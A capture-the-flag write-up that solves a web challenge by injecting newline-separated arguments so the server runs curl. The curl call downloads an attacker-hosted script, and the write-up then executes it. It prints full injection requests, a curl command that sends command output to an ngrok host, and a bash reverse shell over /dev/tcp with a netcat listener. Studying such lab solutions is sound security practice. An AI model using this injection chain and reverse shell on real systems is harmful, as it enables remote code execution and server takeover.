# om2electricbogalo

- Oboi this chall was one wild ride, our entire team worked together on this, here goes 

- After digging around on google we found this writeup

https://github.com/p4-team/ctf/tree/master/2015-10-18-hitcon/web_100_babyfirst#eng-version

- In the writeup they used wget, tar and php, how ever in our chall we have access to a `-`, so we can use curl which makes this soo much easier 

- So get a website up and running(via port forwarding or with a vps) with python and an `index.html`file that has the command you wanna execute, in this case, we wanna  confirm the rce so lets try posting to an ngrok url with id as our command

NOTE: once the website is setup you are going to experience random requests from scanning bots and maybe even a few attacks comming from china, so make sure there are no vulnerable scripts in the current directory ;
```
curl NGROK_IP -d cmd=`id`
```

- Then input the correct parameters to make the website call to our website(look into the writeup above), make sure to change your ip to long format cuz `.` is banned

To download the script
```
curl -i -s -k -X $'GET' \
    -H $'Host: 147.182.172.217:42004' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' \
    $'http://147.182.172.217:42008/?args[]=hello%0a&args[]=curl&args[]=YOUR_IP_LONG&args[]=-o&args[]=shell-script'
```

To execute it
```
curl -i -s -k -X $'GET' \
    -H $'Host: 147.182.172.217:42004' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' \
    $'http://147.182.172.217:42008/?args[]=hello%0a&args[]=sh&args[]=shell-script'
```

NOTE: `%0A` is url encoded `\n` used to escape the `echo` but it also needs a letter before it to work, hence the `hello`, anything that needs to be seperated by whitespace needs to go after another `&args[]=`

![image](https://user-images.githubusercontent.com/69097212/133955389-aff7119d-13e8-4348-afc4-30a89744207c.png)

SUCCESS!!

- Now just get a standard bash reverse shell on the server and start looking around

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/6.tcp.ngrok.io/11129 0>&1'
```

- Make sure its going through an ngrok tcp tunnel `ngrok tcp 8000` and netcat is listening `nc -lnvp 8000`

- The flag took me wayyyyyyy too long to find, after a long time and a hint from ZerodayTea, i found it in the environment variable

# Flag flag{wow_omg_the_power_of_smol_hacc_without_wget_to_get_lorge_flag_omg_youre_so_cool_who_knew_that_site_input_used_server_side_could_be_dangerous_did_you_cOrL_this_oneeee?}
